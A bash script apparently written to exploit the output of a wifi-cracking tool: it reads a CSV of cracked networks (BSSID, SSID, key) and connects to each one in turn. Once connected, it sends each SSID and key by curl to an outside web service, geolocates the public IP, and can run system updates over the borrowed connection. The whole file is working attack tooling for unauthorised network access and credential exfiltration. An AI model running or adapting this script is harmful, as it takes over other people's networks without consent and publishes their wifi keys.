#!/bin/bash
source $(dirname "$0")/libkoca.sh
koca_lockMe -q /tmp/$(basename "$0").lock 2
gotRoot || echo 'Must be run as root'
t=$(mktemp)
connect_fail=$(mktemp)
if=wlan0
trap "reset_if $if ; rm -f $t $connect_fail" 0
cracked=$HOME/cracked.csv
WS_EXPIRATION=36000
function reset_if() {
	local if=$1
	dhclient -r $if
	ifconfig $if 0.0.0.0
	ifconfig $if down
	iwconfig $if mode managed essid '' key off
}
function connect() {
	ifconfig $if up
	ssid="$1"
	key="$2"
	bssid="$3"
	iwconfig $if ap $bssid
	iwconfig $if key $key
	if [ -n $ssid ]
	then
		iwconfig $if essid "$ssid"
	fi
	for i in $(seq 0 10 100)
	do
		#iwconfig $if | grep -q "ESSID:\"$1\"" && return 0
		iw $if link | grep -q "SSID: $1" && return 0
		sleep 1
		koca_spin
	done
	echo
	return 1
}
function wait_for_ip() {
	for i in $(seq 1 10)
	do
		ifconfig $if | grep -q inet && return 0
		sleep 1
		koca_spin
	done
	echo
	return 1
}
while [ "$1" != "" ]
do
	case $1 in
		-h)
			echo " -u		: udpate files when connected"
			echo " -c <file>	: cracked file"
			exit 0
			;;
		-u) export UPDATE_ME=yes;;
		-c) export cracked=$2;shift;;
	esac
	shift
done
echo "Waiting $cracked"
while [ ! -e $cracked ]
do
	sleep 1
done
while true
do
	reset_if $if
	echo -n -e "\r                                                      "
	echo -n -e "\rWaiting  "
	koca_spin
	for line in $(tac $cracked)
	do
		bssid=$(echo $line | cut -d ',' -f 1)
		ssid=$(echo $line | cut -d ',' -f 3)
		key=$(echo $line | cut -d ',' -f 4)
		if egrep -q "^$bssid$" $t
		then
			#echo -n "$ssid : connection tested"
			sleep 3 
			continue
		fi
		if egrep -q "^$bssid$" $connect_fail
		then
			#echo -n "$ssid : connection was failed"
			sleep 3
			continue
		fi
		echo -n -e  "\rAuthenticating to $ssid ($bssid)  "
		if connect "$ssid" "$key" "$bssid"
		then
			echo 'ok'
			dhclient -1 $if
			echo -n 'Getting ip  '
			wait_for_ip || continue
			echo 'ok'
			#route add default gw 192.168.0.254
			echo -n 'Publication ... '
			curl -s "ws.korsani.fr/dazi/?_method=patch&expiration=$WS_EXPIRATION" -d wifi=$ssid > /dev/null 
			curl -s ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION -d $ssid=$key > /dev/null && echo 'ok' && echo $bssid >> $t
			geoiplookup $(curl -s ws.korsani.fr/myip)
			if [ -n "$UPDATE_ME" ]
			then
				echo 'Updating myself'
				apt-get update > /dev/null
				apt-get -y upgrade > /dev/null
				#$HOME/bin/wifite.py --update >/dev/null
			fi
			reset_if $if
		else
			echo 'failed'
			echo $bssid >> $connect_fail
		fi
	done
done
